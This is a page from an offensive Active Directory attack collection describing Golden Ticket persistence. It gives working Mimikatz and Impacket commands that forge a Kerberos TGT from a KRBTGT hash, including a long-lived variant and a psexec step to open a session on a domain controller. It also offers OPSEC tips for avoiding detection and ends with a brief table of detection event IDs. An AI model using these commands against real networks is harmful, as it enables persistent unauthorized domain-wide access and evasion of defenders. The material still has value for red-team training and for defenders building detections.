---
title: "Attack #64 — Golden Ticket Persistence"
description: "A Golden Ticket provides persistent domain access by forging TGTs using the KRBTGT hash. As a persistence technique (not just one-time escalation), the…"
category: active-directory
tags: ["active-directory", "kerberos", "adcs", "credential-access", "persistence"]
tools: ["Impacket", "Mimikatz", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Eight/🟤 Attack #64 — Golden Ticket Persistence.md"
---
# 🟤 Attack #64 — Golden Ticket Persistence

***

## 📖 How It Works

A Golden Ticket provides **persistent domain access** by forging TGTs using the KRBTGT hash. As a persistence technique (not just one-time escalation), the attacker stores the KRBTGT hash offline and forges new TGTs whenever needed — maintaining access even if the compromised DA account's password is reset. Only a **double KRBTGT password rotation** invalidates existing Golden Tickets.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **KRBTGT hash** | Previously extracted via DCSync |
| **Domain SID** | For ticket crafting |

***

## 💻 Full Commands

```powershell
# ── Forge Golden Ticket for persistent access ─────────────────────────────────
mimikatz.exe
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /ptt

# ── With 10-year validity ────────────────────────────────────────────────────
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-3878595448-1012506728-1948843120 \
  /krbtgt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  /startoffset:-10 /endin:43200 /renewmax:86400 /ptt
```

```bash
# ── Impacket — forge and save Golden Ticket ───────────────────────────────────
ticketer.py -nthash 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d \
  -domain-sid S-1-5-21-3878595448-1012506728-1948843120 \
  -domain corp.local Administrator

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@DC01.corp.local
```

***

## 🎯 OPSEC Tips

- **Store KRBTGT hash securely** — it's the key to unlimited domain access
- **Forge tickets as needed** — don't use a single Golden Ticket continuously
- **Use Diamond (#13) or Sapphire (#14) Tickets** for better OPSEC
- **Only invalidated by**: KRBTGT password reset **twice** (to clear both current and previous keys)

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4769** | Security Log (DC) | TGS request with no corresponding 4768 AS-REQ |
| **4624** | Security Log | DA logon from unexpected source with no prior TGT event |

***

> ✅ **Attack #64 — Golden Ticket Persistence complete.**
